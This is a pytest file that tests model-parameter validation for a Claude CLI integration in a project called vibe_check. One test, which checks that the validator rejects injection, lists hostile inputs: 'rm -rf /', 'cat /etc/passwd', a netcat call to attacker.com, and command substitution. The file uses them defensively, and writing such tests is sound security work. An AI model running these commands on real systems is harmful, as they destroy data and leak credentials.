"""
Test model parameter validation for Claude CLI integration.

Validates security, error handling, and proper model parameter support.
"""

import pytest
from unittest.mock import patch, MagicMock
from vibe_check.tools.shared.claude_integration import (
    _validate_model,
    ClaudeCliExecutor,
    analyze_content_sync,
)


class TestModelValidation:
    """Test model parameter validation and security."""

    def test_valid_simple_models(self):
        """Test validation of simple model names."""
        valid_models = ["sonnet", "opus", "haiku"]

        for model in valid_models:
            result = _validate_model(model)
            assert result == model

    def test_valid_full_model_names(self):
        """Test validation of full model names."""
        valid_full_models = [
            "claude-sonnet-4-20250514",
            "claude-opus-3-20241022",
            "claude-haiku-3-20241022",
            "claude-3.5-sonnet",
            "claude-3.0-opus",
        ]

        for model in valid_full_models:
            result = _validate_model(model)
            assert result == model

    def test_command_injection_prevention(self):
        """Test that dangerous characters are rejected."""
        dangerous_models = [
            "sonnet; rm -rf /",
            "opus && cat /etc/passwd",
            "haiku | nc attacker.com 80",
            "sonnet`whoami`",
            "opus$(id)",
            "haiku{bad}",
            "sonnet<script>",
            "opus>output.txt",
        ]

        for model in dangerous_models:
            with pytest.raises(ValueError, match="dangerous characters"):
                _validate_model(model)

    def test_empty_and_invalid_types(self):
        """Test validation of empty strings and invalid types."""
        with pytest.raises(ValueError, match="non-empty string"):
            _validate_model("")

        with pytest.raises(ValueError, match="non-empty string"):
            _validate_model(None)

        with pytest.raises(ValueError, match="non-empty string"):
            _validate_model(123)

    def test_unknown_model_warning(self):
        """Test that unknown models generate warnings but are allowed."""
        unknown_model = "custom-model-name"

        with patch("vibe_check.tools.shared.claude_integration.logger") as mock_logger:
            result = _validate_model(unknown_model)
            assert result == unknown_model
            mock_logger.warning.assert_called_once()
            assert "Unknown model" in mock_logger.warning.call_args[0][0]

    def test_model_parameter_forwarding(self):
        """Test that model parameter is properly forwarded through the call chain."""
        executor = ClaudeCliExecutor(timeout_seconds=1)

        # Test that _get_claude_args includes the model parameter
        args = executor._get_claude_args("test prompt", "general", "opus")

        # Should contain --model opus
        assert "--model" in args
        model_index = args.index("--model")
        assert args[model_index + 1] == "opus"

    def test_model_validation_in_get_claude_args(self):
        """Test that _get_claude_args validates the model parameter."""
        executor = ClaudeCliExecutor(timeout_seconds=1)

        # Test with dangerous model
        with pytest.raises(ValueError, match="dangerous characters"):
            executor._get_claude_args("test", "general", "opus; rm -rf /")

    @patch("subprocess.run")
    def test_model_error_context_sync(self, mock_run):
        """Test that model-related errors include proper context in sync execution."""
        mock_result = MagicMock()
        mock_result.returncode = 1
        mock_result.stderr = "Invalid model 'bad-model'"
        mock_result.stdout = ""
        mock_run.return_value = mock_result

        executor = ClaudeCliExecutor(timeout_seconds=1)
        result = executor.execute_sync("test", "general", "bad-model")

        assert not result.success
        assert "Model 'bad-model' error" in result.error

    @pytest.mark.asyncio
    @patch("asyncio.create_subprocess_exec")
    async def test_model_error_context_async(self, mock_create_subprocess):
        """Test that model-related errors include proper context in async execution."""
        mock_process = MagicMock()
        mock_process.returncode = 1
        mock_process.communicate.return_value = (b"", b"Invalid model 'bad-model'")
        mock_create_subprocess.return_value = mock_process

        executor = ClaudeCliExecutor(timeout_seconds=1)

        with patch("asyncio.wait_for") as mock_wait_for:
            mock_wait_for.return_value = (b"", b"Invalid model 'bad-model'")
            result = await executor.execute_async("test", "general", "bad-model")

        assert not result.success
        assert "Model 'bad-model' error" in result.error

    def test_analyze_content_sync_model_parameter(self):
        """Test that analyze_content_sync accepts and validates model parameter."""
        with patch(
            "vibe_check.tools.shared.claude_integration.ClaudeCliExecutor"
        ) as mock_executor_class:
            mock_executor = MagicMock()
            mock_executor_class.return_value = mock_executor
            mock_executor.execute_sync.return_value = MagicMock(
                success=True, output="test"
            )

            analyze_content_sync("test content", model="opus")

            # Verify executor was called with correct model
            mock_executor.execute_sync.assert_called_once()
            call_args = mock_executor.execute_sync.call_args
            assert "opus" in str(call_args)  # Model should be in the call

    def test_default_model_parameter(self):
        """Test that default model parameter is 'sonnet'."""
        executor = ClaudeCliExecutor(timeout_seconds=1)

        # Test default model
        args = executor._get_claude_args("test prompt", "general")

        assert "--model" in args
        model_index = args.index("--model")
        assert args[model_index + 1] == "sonnet"


class TestModelParameterIntegration:
    """Integration tests for model parameter support."""

    def test_all_llm_functions_support_model_parameter(self):
        """Test that all LLM functions support the model parameter."""
        # This test ensures we don't miss any functions when adding model support
        from vibe_check.tools.analyze_llm.text_analyzer import analyze_text_llm
        from vibe_check.tools.analyze_llm.specialized_analyzers import (
            analyze_pr_llm,
            analyze_code_llm,
            analyze_issue_llm,
        )

        # Test that all functions have model parameter in their signatures
        import inspect

        functions_to_test = [
            analyze_text_llm,
            analyze_pr_llm,
            analyze_code_llm,
            analyze_issue_llm,
        ]

        for func in functions_to_test:
            sig = inspect.signature(func)
            assert (
                "model" in sig.parameters
            ), f"Function {func.__name__} missing model parameter"

            # Check default value is "sonnet"
            model_param = sig.parameters["model"]
            assert (
                model_param.default == "sonnet"
            ), f"Function {func.__name__} model default is not 'sonnet'"


if __name__ == "__main__":
    # Run tests directly
    print("🧪 Testing Model Parameter Validation...")
    print()

    test_validation = TestModelValidation()
    test_integration = TestModelParameterIntegration()

    try:
        # Run validation tests
        test_validation.test_valid_simple_models()
        print("✅ Valid simple models test passed")

        test_validation.test_valid_full_model_names()
        print("✅ Valid full model names test passed")

        test_validation.test_command_injection_prevention()
        print("✅ Command injection prevention test passed")

        test_validation.test_empty_and_invalid_types()
        print("✅ Empty and invalid types test passed")

        test_validation.test_unknown_model_warning()
        print("✅ Unknown model warning test passed")

        test_validation.test_model_parameter_forwarding()
        print("✅ Model parameter forwarding test passed")

        test_validation.test_model_validation_in_get_claude_args()
        print("✅ Model validation in get_claude_args test passed")

        test_validation.test_default_model_parameter()
        print("✅ Default model parameter test passed")

        # Run integration tests
        test_integration.test_all_llm_functions_support_model_parameter()
        print("✅ All LLM functions support model parameter test passed")

        print()
        print("✅ All model validation tests passed!")

    except Exception as e:
        print(f"❌ Test failed: {e}")
        raise
